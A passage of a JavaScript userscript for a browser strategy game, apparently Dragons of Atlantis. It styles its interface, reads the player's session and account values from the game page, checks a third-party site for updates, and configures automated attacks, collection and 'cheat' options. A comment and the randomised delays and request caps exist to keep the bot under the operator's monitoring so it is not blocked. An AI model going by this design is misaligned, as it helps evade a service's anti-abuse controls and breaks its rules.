	table.' + UID['table'] + ' tr th,\
	table.' + UID['compact_table'] + ' tr th,\
	table.' + UID['compact_console'] + ' tr th,\
	table tr.' + UID['row_top_headers'] + ' td\
	{\
		color				: #FFE;\
		background-color	: rgba(40,40,40,0.3);\
		border				: 1px solid;\
		border-color		: rgba(210,210,210,0.5);\
		border-top			: rgba(160,160,160,0.5);\
		border-left			: rgba(160,160,160,0.5);\
		box-shadow			: 1px 1px 1px rgba(0,0,0,0.2) inset;\
		-moz-box-shadow		: 1px 1px 1px rgba(0,0,0,0.2) inset;\
		-webkit-box-shadow	: 1px 1px 1px rgba(0,0,0,0.2) inset;\
	}\
	table tr.' + UID['row_top_headers'] + ' td {\
		background-color	: rgba(80,80,80,0.6);\
	}\
	input.' + UID['btn_on'] + ',\
	input.' + UID['btn_off'] + ',\
	input.' + UID['bnt_red'] + ',\
	input.' + UID['bnt_green'] + ',\
	input.' + UID['bnt_blue'] + ',\
	input.' + UID['bnt_yellow'] + ',\
	input.' + UID['bnt_orange'] + ',\
	input.' + UID['bnt_cyan'] + ',\
	input.' + UID['bnt_purple'] + ',\
	input.' + UID['bnt_disabled'] + ',\
	.' + UID['main-box'] + ' input[type=button] {\
		border				: 1px solid rgba(50,50,50,0.8);\
	}\
	.' + UID['main-box'] + ' input[type=button] {\
		background-color	: rgba(50,150,220,0.8);\
		border-color		: #39D #39D #28C;\
		text-shadow			: -1px -1px 0 #39D;\
		-moz-text-shadow	: -1px -1px 0 #39D;\
		-webkit-text-shadow	: -1px -1px 0 #39D;\
	}\
	.' + UID['main-box'] + ' input[type=button]:hover {\
		background-color	: rgba(40,150,210,0.8);\
		box-shadow			: rgb(34, 136, 204) 0px 0px 5px 0px;\
		-moz-box-shadow		: rgb(34, 136, 204) 0px 0px 5px 0px;\
		-webkit-box-shadow	: rgb(34, 136, 204) 0px 0px 5px 0px;\
	}\
	input[type=image].' + UID['btn_image_on'] + ',\
	input[type=image].' + UID['btn_image_off'] + ',\
	input[type=image].' + UID['bnt_image_orange'] + ',\
	input[type=image].' + UID['bnt_image_disabled'] + ',\
	input[type=image].' + UID['bnt_image_red'] + ',\
	input[type=image].' + UID['bnt_image_green'] + ' {\
		padding-top			: 1px;\
		padding-bottom		: 1px;\
		border-radius		: 3px;\
		-moz-border-radius	: 3px;\
		-webkit-border-radius: 3px;\
		box-shadow			: rgba(0,0,0,0.52) 1px 1px 1px;\
		-moz-box-shadow		: rgba(0,0,0,0.52) 1px 1px 1px;\
		-webkit-box-shadow	: rgba(0,0,0,0.52) 1px 1px 1px;\
		cursor				: hand;\
		cursor				: pointer;\
		border				: 1px solid rgba(50,50,50,0.8);\
	}\
	input[type=image].' + UID['btn_image_on'] + ',\
	input[type=image].' + UID['bnt_image_green'] + ' {\
		background-color	: rgba(0,160,110,0.8) !important;\
		border-color		: #3eddab #3eddab #30a580 !important;\
	}\
	input[type=image].' + UID['btn_image_on'] + ':hover,\
	input[type=image].' + UID['bnt_image_green'] + ':hover {\
		background-color	: rgba(0,200,150,0.8) !important;\
		box-shadow			: #11d899 0px 0px 5px 0px !important;\
		-moz-box-shadow		: #11d899 0px 0px 5px 0px !important;\
		-webkit-box-shadow	: #11d899 0px 0px 5px 0px !important;\
	}\
	input[type=image].' + UID['btn_image_off'] + ',\
	input[type=image].' + UID['bnt_image_red'] + ' {\
		background-color	: rgba(184,0,46,0.8) !important;\
		border-color		: #c64162 #c64162 #a33750 !important;\
	}\
	input[type=image].' + UID['btn_image_off'] + ':hover,\
	input[type=image].' + UID['bnt_image_red'] + ':hover {\
		background-color	: rgba(200,50,100,0.8) !important;\
		box-shadow			: #d34a6a 0px 0px 5px 0px !important;\
		-moz-box-shadow		: #d34a6a 0px 0px 5px 0px !important;\
		-webkit-box-shadow	: #d34a6a 0px 0px 5px 0px !important;\
	}\
	input[type=image][disabled].' + UID['bnt_image_disabled'] + ' {\
		background-color : rgba(216,216,216,0.8) !important;\
		border-color		: #aaaaaa #aaaaaa #828282 !important;\
	}\
	input[type=image][disabled].' + UID['bnt_image_disabled'] + ':hover {\
		background-color: rgba(248,248,248,0.2) !important;\
		border-color		: #c8c8c8 #c8c8c8 #aaaaaa !important;\
	}\
	input[type=image].' + UID['bnt_image_orange'] + ' {\
		background-color	: rgba(200,30,0,0.8) !important;\
		border-color		: #F00000 #F00000 #960000 !important;\
	}\
	input[type=image].' + UID['bnt_image_orange'] + ':hover {\
		background-color	: rgba(255,60,0,0.8) !important;\
		box-shadow			: #d34a1e 0px 0px 5px 0px !important;\
		-moz-box-shadow		: #d34a1e 0px 0px 5px 0px !important;\
		-webkit-box-shadow	: #d34a1e 0px 0px 5px 0px !important;\
	}\
	input.' + UID['btn_on'] + ',\
	input.' + UID['bnt_green'] + ' {\
		background-color	: rgba(0,160,110,0.8) !important;\
		border-color		: #3eddab #3eddab #30a580 !important;\
		text-shadow			: -1px -1px 0 #22C390 !important;\
		-moz-text-shadow	: -1px -1px 0 #22C390 !important;\
		-webkit-text-shadow	: -1px -1px 0 #22C390 !important;\
	}\
	input.' + UID['btn_on'] + ':hover,\
	input.' + UID['bnt_green'] + ':hover {\
		background-color	: rgba(0,200,150,0.8) !important;\
		box-shadow			: #11d899 0px 0px 5px 0px !important;\
		-moz-box-shadow		: #11d899 0px 0px 5px 0px !important;\
		-webkit-box-shadow	: #11d899 0px 0px 5px 0px !important;\
	}\
	input.' + UID['btn_off'] + ',\
	input.' + UID['bnt_red'] + ',\
	.' + UID['main-box'] + ' input[type=button][disabled] {\
		background-color	: rgba(184,0,46,0.8) !important;\
		border-color		: #c64162 #c64162 #a33750 !important;\
		text-shadow			: -1px -1px 0 #c64162 !important;\
		-moz-text-shadow	: -1px -1px 0 #c64162 !important;\
		-webkit-text-shadow	: -1px -1px 0 #c64162 !important;\
	}\
	input.' + UID['btn_off'] + ':hover,\
	input.' + UID['bnt_red'] + ':hover,\
	.' + UID['main-box'] + ' input[type=button][disabled]:hover {\
		background-color	: rgba(200,50,100,0.8) !important;\
		box-shadow			: #d34a6a 0px 0px 5px 0px !important;\
		-moz-box-shadow		: #d34a6a 0px 0px 5px 0px !important;\
		-webkit-box-shadow	: #d34a6a 0px 0px 5px 0px !important;\
	}\
	input.' + UID['bnt_orange'] + ' {\
		background-color	: rgba(200,30,0,0.8) !important;\
		border-color		: #F00000 #F00000 #960000 !important;\
	}\
	input.' + UID['bnt_orange'] + ':hover {\
		background-color	: rgba(255,60,0,0.8) !important;\
		box-shadow			: #d34a1e 0px 0px 5px 0px !important;\
		-moz-box-shadow		: #d34a1e 0px 0px 5px 0px !important;\
		-webkit-box-shadow	: #d34a1e 0px 0px 5px 0px !important;\
	}\
	.' + UID['main-box'] + ' input[type=button][disabled].' + UID['bnt_disabled'] + ' {\
			background-color : rgba(216,216,216,0.8) !important;\
		border-color		: #aaaaaa #aaaaaa #828282 !important;\
		text-shadow			: -1px -1px 0 #aaaaaa !important;\
		-moz-text-shadow	: -1px -1px 0 #aaaaaa !important;\
		-webkit-text-shadow	: -1px -1px 0 #aaaaaa !important;\
	}\
	.' + UID['main-box'] + ' input[type=button][disabled].' + UID['bnt_disabled'] + ':hover {\
		background-color: rgba(248,248,248,0.2) !important;\
		border-color		: #c8c8c8 #c8c8c8 #aaaaaa !important;\
		text-shadow			: -1px -1px 0 #c8c8c8 !important;\
		-moz-text-shadow	: -1px -1px 0 #c8c8c8 !important;\
		-webkit-text-shadow	: -1px -1px 0 #c8c8c8 !important;\
	}\
	input.' + UID['bnt_blue'] + ' {\
		background-color	: rgba(0,94,189,0.8);\
	}\
	input.' + UID['bnt_blue'] + ':hover {\
		background-color	: rgba(0,125,150,0.8);\
	}\
	.' + UID['main-box'] + ' input[type=text]:active,\
	.' + UID['main-box'] + ' input[type=text]:focus {\
		border-color		: rgba(0,0,0,0.8);\
	}\
	.' + UID['hide_inputbox'] + ' input[type=text] {\
		background-color	: rgba(255,255,255,0.3);\
		border				: 1px solid rgba(0,0,0,0.4);\
	}\
	.' + UID['bold_red'] + ' {\
		color				: #500;\
	}\
	.' + UID['map-viewer'] + ' {\
		color				: #000;\
		background-color	: #8A8;\
		border				: 1px solid #666;\
	}\
	.' + UID['map-viewer-dragger'] + ' {\
		background-color	: rgba(240,40,40,0.3);\
		border 				: 1px solid #E55;\
	}\
	.' + UID['map-viewer-dragger'] + ':hover {\
		background-color	: rgba(255,0,0,0.3);\
	}\
	.' + UID['map-viewer-dragger'] + ' .jewel {\
		color				: #000 !important;\
		background-color	: rgba(255,255,255,0.7);\
		border 				: 1px solid #EEE;\
	}\
	/* TeamWork_jQuery UI */\
	.ui-widget-content\
	{\
		border				: 1px solid #dddddd;\
		/*background-color	: rgba(170,170,170,0.7);*/\
		background-image: url(https://wackoscripts.com/bg.png);\
		color: #303030;\
	}\
	.ui-widget-content a\
	{\
		color				: #303030;\
	}\
	.ui-widget-header\
	{\
		border				: 1px solid #777777;\
		background-color	: rgba(30,30,30,0.8);\
		color				: #FFE;\
		font-weight			: bold;\
	}\
	.ui-widget-header a\
	{\
		color				: #FFE;\
	}\
	/* Interaction states\
	----------------------------------*/\
	.ui-state-default,\
	.ui-widget-content .ui-state-default,\
	.ui-widget-header .ui-state-default,\
	.ui-state-focus,\
	.ui-widget-content .ui-state-focus,\
	.ui-widget-header .ui-state-focus\
	{\
		border				: 1px solid #999999;\
		background-color	: rgba(100,100,100,0.8);\
		font-weight			: bold;\
		color				: #FFE;\
	}\
	.ui-state-default a,\
	.ui-state-default a:link,\
	.ui-state-default a:visited\
	{\
		color				: #FFE;\
		text-decoration		: none;\
	}\
	.ui-state-hover,\
	.ui-widget-content .ui-state-hover,\
	.ui-widget-header .ui-state-hover\
	{\
	}\
	.ui-state-hover a,\
	.ui-state-hover a:hover\
	{\
		color				: #FFE;\
		text-decoration		: none;\
	}\
	.ui-state-active,\
	.ui-widget-content .ui-state-active,\
	.ui-widget-header .ui-state-active\
	{\
		border				: 1px solid rgba(120,120,120,0.8);\
		background-color	: rgba(70,70,70,0.8);\
		font-weight			: bold;\
		color				: #FFE;\
	}\
	.ui-state-active a,\
	.ui-state-active a:link,\
	.ui-state-active a:visited\
	{\
		color				: #FFE;\
		text-decoration		: none;\
	}\
	.ui-widget :active\
	{\
		outline				: none;\
	}\
	/* Interaction Cues\
	----------------------------------*/\
	.ui-state-highlight,\
	.ui-widget-content .ui-state-highlight,\
	.ui-widget-header .ui-state-highlight\
	{\
		border				: 1px solid #fed22f;\
		background-color	: rgba(255,230,90,0.8);\
		color				: #363636;\
	}\
	.ui-state-highlight a,\
	.ui-widget-content .ui-state-highlight a,\
	.ui-widget-header .ui-state-highlight a\
	{\
		color				: #363636;\
	}\
	.ui-state-error,\
	.ui-widget-content .ui-state-error,\
	.ui-widget-header .ui-state-error\
	{\
		border				: 1px solid #cd0a0a;\
		background-color	: rgba(185,25,0,0.8);\
		color				: #FFE;\
	}\
	.ui-state-error a,\
	.ui-widget-content .ui-state-error a,\
	.ui-widget-header .ui-state-error a\
	{\
		color				: #FFE;\
	}\
	.ui-state-error-text,\
	.ui-widget-content .ui-state-error-text,\
	.ui-widget-header .ui-state-error-text\
	{\
		color				: #FFE;\
	}\
	.ui-widget-overlay\
	{\
		background-color	: rgba(170,170,170,0.7);\
	}\
	.ui-widget-shadow\
	{\
		background-color	: #000;\
	}\
	/* TeamWork_jQuery UI Selectable 1.8.16 */\
	.ui-selectable-helper\
	{\
		border:1px dotted #000;\
	}\
	/* TeamWork_jQuery UI Dialog 1.8.16  */\
	.ui-dialog .ui-dialog-title {\
		color				: rgba(255,255,255,0.7);\
	}\
	.ui-dialog .ui-dialog-titlebar-close {\
		background-color	: rgba(0,0,0,0.3);\
		border				: 1px solid transparent;\
	}\
	.ui-dialog .ui-dialog-titlebar-close:hover,\
	.ui-dialog .ui-dialog-titlebar-close:focus\
	{\
		background-color 	: rgba(210,50,80,0.8);\
		border				: 1px solid #960D16;\
		-webkit-box-shadow	: rgba(250,90,120,0.8) 0 0 8px;\
		-moz-box-shadow		: rgba(250,90,120,0.8) 0 0 8px;\
		-khtml-box-shadow	: rgba(250,90,120,0.8) 0 0 8px;\
		box-shadow			: rgba(250,90,120,0.8) 0 0 8px;\
	}\
').appendTo( 'head' );

/********************************************************************************
 * Extract the flashvars from the SWF object and initialise the appropriate     *
 * global variables.                                                            *
 *                                                                              *
 * USED                                                                         *
 *  - api_server                                                                *
 *  - dragon_heart                                                              *
 *  - facebook_id                                                               *
 *  - locale                                                                    *
 *  - session_id                                                                *
 *  - user_hash                                                                 *
 *  - user_id                                                                   *
 *  - user_time                                                                 *
 *                                                                              *
 * UNUSED                                                                       *
 *  - building_cachebreaker                                                     *
 *  - lazy_loaded_swf_cachebreaker                                              *
 *  - primary_ui_cachebreaker                                                   *
 *  - pub_port                                                                  *
 *  - pub_server                                                                *
 *  - second_ui_cachebreaker                                                    *
 *  - sound_cachebreaker                                                        *
 *  - s3_server                                                                 *
 *  - s3_swf_prefix                                                             *
 ********************************************************************************/
 var API_SERVER, /* Global constants from object flashvars (see getFlashvars) */
	 DRAGON_HEART,
	 FACEBOOK_ID,
	 LOCALE,
	 SESSION_ID,
	 USER_HASH,
	 USER_ID,
	 USER_TIME,
	 S3_SERVER,
	 S3_SWF_PREFIX,
	 MAP_BIN_CACHEBREAKER,
	 PUB_PORT,
	 PUB_SERVER,
	 PLATFORM;

function getFlashvars()
{
	var flashvars = $J( SWF_OBJECT + ' param[name="flashvars"]' ).attr( 'value' ).split( '&' ),
		keyValue,
		rslt = {};
		
	$J.each( flashvars, function () {
		keyValue = this.split('=');
		rslt[keyValue[0]] = keyValue[1];
	});
	
	API_SERVER	 = rslt.api_server;
	DRAGON_HEART = rslt.dragon_heart;
	FACEBOOK_ID	 = rslt.facebook_id;
	LOCALE		 = rslt.locale;
	SESSION_ID	 = rslt.session_id;
	USER_HASH	 = rslt.user_hash;
	USER_ID		 = rslt.user_id;
	USER_TIME	 = rslt.user_time;
	S3_SERVER	 = rslt.s3_server;
	S3_SWF_PREFIX= rslt.s3_swf_prefix;
	MAP_BIN_CACHEBREAKER = rslt.map_bin_cachebreaker;
	PUB_PORT = rslt.pub_port;
	PUB_SERVER = rslt.pub_server;
	PLATFORM = rslt.platform;
	SERVER_ID	 = ( /realm(\d+)\./.exec( API_SERVER ) || ['',''] )[1];
	
	setTimeout ( scriptStartUp, SCRIPT_STARTUP_DELAY );

}

/************************
**   scriptStartUp
*************************/
function updateChecker(callback){
	/*
	 * Check against userscript to see if we have the latest
	 */
	var current_version = SCRIPT_VERSION;
	var url_update_checker = 'http://wackoscripts.com/updatecheck.php'
	try{
		var req = new XMLHttpRequest();
	  req.open("GET", url_update_checker, true);
	            //req.setRequestHeader("X-Requested-With", "XMLHttpRequest");
	            //req.setRequestHeader("Accept", "*/*");
	            //req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		req.send();
	  req.onreadystatechange = function () {
	  	if (this.readyState == 4) {
	    	var response =  JSON.parse(req.responseText);
	     
	      if (response){
	      	var userscript_version = response.version;
	      	
	        if (userscript_version > current_version){
	      		//there is a new version
	        	dialogBox({
	    				id    : setUID('dialog-confirm'),
	    				position  : [parseInt(document.body.offsetWidth-(document.body.offsetWidth-760)/2-width/2), Math.randRange(0,20)],
	    				width   : width,
	    				height   : Math.randRange(150,160),
	    				title   : ' Update Availble',
	    				html   : SCRIPT_NAME+' has been updated to '+response.version+'<br><br>'
	    				    + 'Do you want to update now?',
	    				buttons   : [
	    				 {
	    				  text: 'Yes',
	    				  click: function() {
	    				   window.open('http://userscripts.org/scripts/show/124689','_blank');
	    				   $J(this).dialog('destroy');
	    				  }
	    				 },
	    				 {
	    				  text: 'No',
	    				  click: function() { 
	    				   $J(this).dialog('destroy');
	    				  }
	    				 }
	    				]
	   				});
	     		}
	    	}
	    }
		};
		if (callback)
			callback && callback()        
	} catch(e) {}
}


console.log ( SCRIPT_NAME + ' Startup in : ' + timeFormat( SCRIPT_STARTUP_DELAY *3 / 1000 ).stripTags() );

var STARTUP_TIMER;

function scriptStartUp()
{
	try {
		
		/**  Data Initialization
		***************************************/
		// Init Defaults Options
		Data.init ({
			options		: {
				api_version		: API_VERSION,
				main_box		: { draggable:true, x:0, y:0 },
				debug_mode		: DEBUG_MODE,
				current_tab		: false,
				use_locale      : '',
				cheat : {
					blue_energy		: true,
					outpost_research : false,
					dragon_healing : false,
					heal_dragon : {}
				},
				delete_reports : {
					transport : false,
					trading		: false
				},
				sound : {
					disable_music : true,
					disable_jobs	: false,
					disable_fortuna : false,
					disable_sentinel : false,
					URL_sentinel_2 : Sound.DEFAULT_SOUND_URL.sentinel_2,
					URL_sentinel_1 : Sound.DEFAULT_SOUND_URL.sentinel_1,
					URL_jobs_building : Sound.DEFAULT_SOUND_URL.jobs_building,
					URL_jobs_units : Sound.DEFAULT_SOUND_URL.jobs_units,
					URL_jobs_research : Sound.DEFAULT_SOUND_URL.jobs_research,
					URL_fortuna : Sound.DEFAULT_SOUND_URL.fortuna
				},

				attacks		: { 
					 enabled				: false
					,current_tab			: 0
					,level_enable			: ['',0,0,0,0,0,0,0,0,0,0,0]
					,level_dist				: ['',14,14,14,14,14,14,14,14,14,14,14]
					,dragons_enable		    : ['',0,0,0,0,0,0,0,0,0,0,0]
					,filter_targets	: ''
					,abandon_wildernesses	: false
					,clear_all_targets		: false
					,delete_reports			: true
					,log_attacks			: true
					,recall_encamped		: false
					,stop_on_loss			: true
					,randomise_attacks		: false
					,order_by_time    		: false
					,units					: ['',{},{},{},{},{},{},{},{},{},{},{}]
					
					/*
					* WARNING: Changing this values cause Too many requests to the server 
					*          that are monitored. Thats gives them reason to increase the security 
					*          on the servers and, sooner or later, make this scripts unusable.
					*            
					*      PLEASE, BE SMART, DON'T HELP THEM TO SEEK WAYS TO BLOCK THIS SCRIPT
					*
					*                   ( We will end up losing everyone )
					*/
					,delay_min				: 30
					,delay_max				: 110
				},
				
				auto_collect	: {
					 enabled	: false
					,last_time	: 0
					,delay		: 1
					,unit		: 3600
					,requests	: {
						 start_at				: 0
						,counter				: 0
						,max_per_hour           : 55
					}
				},

				alliance	: {
					last_update		: '',
					alliance_update	: '',
					activity_update	: '',
					current_tab		: 0,
					transport_id	: 0,
					reinforce_id	: 0,
					auto_id			: 0,
					sort_list		: '0',
					sort_alliance	: '0',
					sort_activity	: '0',
					data		 : {
						transports	: {},
						resources	: {},
						units		: {}
					},
					auto_trsp	: {
						enabled		: false,
						unit	: 60,
						delay	: 30,
						plans	: []
					}
				},

				auto_refresh	: {
					 enabled		: false
					,last_time		: 0
					,delay			: 15
				},

				building		: { 
					 enabled			: false
					,current_tab		: 0
					,accordion			: 0
					,level_enable		: [{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}]
					,level_cap			: [{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}]
				},
				
				info			: {
					current_tab			: 0
				},

				sentinel : {
					 messages : []
					,delete_message : false
					,msg_keeping : { 
						 unit  : 86400
						,delay : 1 }
					,enabled : true
					,disable_spy_alarm : false
					,current_tab : 1
					,repeat_alarm : true
					,time_repeat : {
						 unit  : 3600
						,delay : 1 }
					,wall : {
						 options : {
						 		 save_ress : false
						 		,save_ress_order : []
						 		,use_truce : false
						 }
						,config_select : 0
						,config : [
							{
								 name : 'Config 1'
								,units : {}
							},
							{
								 name : 'Config 2'
								,units : {}
							},
							{
								 name : 'Config 3'
								,units : {}
							},
							{
								 name : 'Config 4'
								,units : {}
							},
							{
								 name : 'Config 5'
								,units : {}
							}
						]
					}
				},
				
				jobs			: {
					current_tab			: 0
				},
				
				marches			: {
					 maximum				: 0
					,requests : {
						 start_at				: 0
						,counter				: 0
						,max_per_hour           : 55
					}
				},
				
				map				: {
					 selected			: 'AnthropusCamp'
					,radius				: 14
					,x					: 0
					,y					: 0
					,scanx					: null
					,scany					: null
					,requests : {
						 start_at				: 0
						,counter				: 0
						,max_per_hour           : 55
					}
				},
				
				research	: {
					 enabled			: false
					,current_tab		: 0
					,accordion			: 0
					,level_enable		: {}
					,level_cap			: {}
				},
				
				training		: {
					 enabled			: false
					,current_tab		: 0
					,accordion			: 0
					,city				: [
						{
							units : {
							}
						 }
						,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
						 ,{
							units : {
							}
						 }
					]
					,units_cap	: {
					}
					,mode				: 'population'
					,requests : {
						 start_at				: 0
						,counter				: 0
						,max_per_hour           : 55
					}
				},
				
				resurrection		: {
					 enabled			: false
					,current_tab		: 0
					,accordion			: 0
					,city				: [
						 {
							units : {
							}
						 }
					]
					,requests : {
						 start_at				: 0
						,counter				: 0
						,max_per_hour           : 55
					}
				},

				waves			: {
					 enabled			: false
					,maximum				: 0
					,current_tab		: 0
					,stop_on_loss		: true
					,delete_reports		: true
					,delay_min			: 30
					,delay_max			: 70
					,nb_waves				: 1
					,stop_wave_serie_on_error	: true
					,not_send_serie_if_max : false
					,wave : [
						{
						 units 				: {}
						,dragons			: {}
						,synchronize_with : -1
						,time_synchronize : 5
						},
						{
						 units 				: {}
						,dragons			: {}
						,synchronize_with : 0
						,time_synchronize : 5
						},
						{
						 units 				: {}
						,dragons			: {}
						,synchronize_with : 1
						,time_synchronize : 5
						},
						{
						 units 				: {}
						,dragons			: {}
						,synchronize_with : 2
						,time_synchronize : 5
						},
						{
						 units 				: {}
						,dragons			: {}
						,synchronize_with : 3
						,time_synchronize : 5
						}
					]
					,target	: {
						 x		: 0
						,y		: 0
						,type	: ''
						,level	: 0
					}
				},
				
				messages		: {
					 last_read	: 0
					,missing	: 0 
					,requests : {
						 start_at				: 0
						,counter				: 0
						,max_per_hour           : 55
					}
				},
								
			},
			
			dynamic	: {
				recall_marches	: [],
				players	: {
					memberships				: [],
					memberships_evolution	: [],
					alliances				: [],
					friends					: [],
					foes					: [],
					alliances_evolution		: [],
					activity				: []
				}
			},

			requests: {
				 start_at	: 0
				,run_time	: 0
				,abandon      : {total:0,errors:0}
				,building     : {total:0,errors:0}
				,cities       : {total:0,errors:0}
				,collect      : {total:0,errors:0}
				,defended     : {total:0,errors:0}
				,defense      : {total:0,errors:0}
				,generals     : {total:0,errors:0}
				,items        : {total:0,errors:0}
				,manifest     : {total:0,errors:0}
				,map          : {total:0,errors:0}
				,marches      : {total:0,errors:0}
				,player		  : {total:0,errors:0}
				,recalls      : {total:0,errors:0}
				,reports      : {total:0,errors:0}
				,reports_del  : {total:0,errors:0}
				,reports_read : {total:0,errors:0}
				,research     : {total:0,errors:0}
				,resurrect    : {total:0,errors:0}
				,release      : {total:0,errors:0}
				,training     : {total:0,errors:0}
				,summon     : {total:0,errors:0}
				,version     : {total:0,errors:0}
			},

			stats	: {
				attacks : {
					 start_at	: 0
					,run_time	: 0
					,total		: 0
					,items		: {
						 resources : {}
						,speedups  : {}
						,production: {}
						,general   : {}
						,chest     : {}
						,arsenal   : {}
						,armors    : {}
						,others	  : {}
						,trooops   : {}
					}
					,levels			: [
						 '' /* the index zero is not used because the levels are from 1 to 11 */
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
						,{total:0, items:{}, resources:{}}
					]
				}
				,waves	: {
					 start_at		: 0
					,run_time		: 0
					,total			: 0 
					,items : {
						 resources : {}
						,speedups  : {}
						,production: {}
						,general   : {}
						,chest     : {}
						,arsenal   : {}
						,armors    : {}
						,others	  : {}
						,trooops   : {}
					}
				}
			},

		});
		                   
		Dragons.initName();
		// Didi : disable research on outpost
		Data.options.cheat.outpost_research = false;
		if (typeof Data.options.sentinel.time_repeat != 'object') {
			Data.options.sentinel.time_repeat = {
						 unit  : 3600
						,delay : 1 };
		}
		
		// Didi : turn off music
		if (Data.options.sound.disable_music) {
			Sound.TurnOff(15);
		}
		
		// Check if the language of the game is different from the browser and Sets
		if ( LOCALE != LANG_CODE && ( Data.options.use_locale === undefined || Data.options.use_locale === '' ) ) {
			var width  = Math.randRange(300,320);
			dialogBox({
				id		  : setUID('dialog-confirm'),
				position  : [parseInt(document.body.offsetWidth-(document.body.offsetWidth-760)/2-width/2), Math.randRange(0,20)],
				width	  : width,
				height	  : Math.randRange(150,160),
				title	  : 'Language Selector',
				html	  : 'The language of the game is different <br> from the language of your browser.<br><br>'
						  + 'Do you want to use the language of the game <br> instead of your browser?',
				buttons   : [
					{
						text: 'Yes',
						click: function() {
							Data.options.use_locale = true;
							setLanguage(LOCALE);
							Translation.init ({
								onSuccess : function ( r ) {},
								onFailure : function ( r ) {},
								delay     : 500
							});
							$J(this).dialog('destroy');
						}
					},
					{
						text: 'No',
						click: function() { 
							Data.options.use_locale = false;
							$J(this).dialog('destroy');
						}
					}
				]
			});
		}
		
		// Set the default locale use
		if ( Data.options.use_locale === undefined || Data.options.use_locale === '' ) {
			Data.options.use_locale = false;
		} else if ( Data.options.use_locale === true ) {
			setLanguage(LOCALE);
		}
		
		// Set Debug Mode from localStorage
		// This changed with the hotkey is Ctrl + Alt + Shift + D)
		if ( Data.options.debug_mode )
		{
			DEBUG_MODE = DEBUG_MARCHES = Data.options.debug_mode;
		}
		
		
		/**  Check basic initialization
		***************************************/
		function stepStarting ( current_step, retry )
		{

			var retry = retry || 0;
			var wait_time = 1000;
			var error_msg;
			var message;
			
			clearTimeout( STARTUP_TIMER );
			
			function onSuccess( r ) {
				verboseLog ( message );
				console.log ( message );

				StepTimeBar.update ( current_step );
				STARTUP_TIMER = setTimeout( stepStarting, wait_time, current_step + 1,0  );
			}
			
			function onFailure( r ) {
				// Bandwidth Limit Exceeded
				if ( r.status === 509 )
				{
					wait_time = ERROR_509_DELAY;
					StepTimeBar.delay += wait_time;
					StepTimeBar.update ( current_step - 1 );
					$startUpBox.append('<br><b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') +'! -  ' + translate('Retry in') + ' :' + timeFormat(wait_time/1000));
					verboseLog('<b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') +'! -  ' + translate('Retry in') + ' :' + timeFormat(wait_time/1000));
					STARTUP_TIMER = setTimeout( stepStarting, wait_time, current_step, ++retry  );
					return;
				}
				if ( r.status === 429 )
				{
					wait_time = ERROR_429_DELAY;
					StepTimeBar.delay += wait_time;
					StepTimeBar.update ( current_step - 1 );
					$startUpBox.append('<br><b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') +'! -  ' + translate('Retry in') + ' :' + timeFormat(wait_time/1000));
					verboseLog('<b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') +'! -  ' + translate('Retry in') + ' :' + timeFormat(wait_time/1000));
					STARTUP_TIMER = setTimeout( stepStarting, wait_time, current_step, ++retry  );
					return;
				}
				StepTimeBar.delay += wait_time;
				STARTUP_TIMER = setTimeout( stepStarting, wait_time, current_step, ++retry);
			}
			
			if ( retry <= 20 )
			{
				switch ( current_step ) 
				{
				/**  Translation Initialization
				***************************************/
				case 1:
					$startUpBox.find('span').html(translate('Charging') + ' ' + translate('Map') + '...');
					message = 'Map Bin Successfully initialised';
					Map.initMapData ({
						onSuccess : onSuccess,
						onFailure : onFailure,
						delay  : 250,
						caller : 'scriptStartUp'
					});
					break;

				/**  Translation Initialization
				***************************************/
				case 2:
					$startUpBox.find('span').html(translate('Charging') + ' ' + translate('Language') + '...');
					message = 'Translation Matrix Successfully initialised';
					Translation.init ({
						onSuccess : onSuccess,
						onFailure : onFailure,
						delay  : 250,
						caller : 'scriptStartUp'
					});
					break;
				
				/**  API_VERSION Initialization
				***************************************/
				case 3:
					$startUpBox.find('span').html(translate('Charging') + ' ' + translate('Version') + '...');
					message = 'API VERSION Successfully initialised';
					Manifest.version ({
						onSuccess : function(r) {
							$startUpBox.title(translate('Charging') + ' v'+ (SCRIPT_VERSION.match(/\d+?\.\d+?\.\d+?[a-z]/)[0]||'') + ' (' + API_VERSION + ') ...');
							onSuccess(r);
						},
						onFailure : onFailure,
						delay  : 250,
						caller : 'scriptStartUp'
					});
					break;
				
				/**  Manifest Initialization
				***************************************/
				case 4:
					$startUpBox.find('span').html(translate('Charging') + ' ' + translate('Information') + '...');
					message = 'Manifest Successfully initialised';
					Manifest.init ({
						onSuccess : onSuccess,
						onFailure : onFailure,
						delay  : 250,
						caller : 'scriptStartUp'
					});
					break;
				
				/**  Seed Initialization
				***************************************/
				case 5:
					$startUpBox.find('span').html(translate('Charging') + ' ' + translate('Your Player') + '...');
					message = 'Seed Successfully initialised';
					Seed.init({
						onSuccess : onSuccess,
						onFailure : onFailure,
						delay  : 250,
						caller : 'scriptStartUp'
					});
					break;
				
				/**  Seed Check Capital City
				***************************************/
				case 6:
					
					var city_id = null;
					var city_idx=0
					// We make sure to first start the capital
					for ( var i=0; i < Seed.city_init.length; i++ )
					{
						if ( Seed.city_init[i].type == 'capital' )
						{
							city_id = Seed.city_init[i].id;
							city_idx = i;
						}
					}
					
					$startUpBox.find('span').html(translate('Charging') + ' ' + translate(Seed.city_init[city_idx].name) + '...');
					
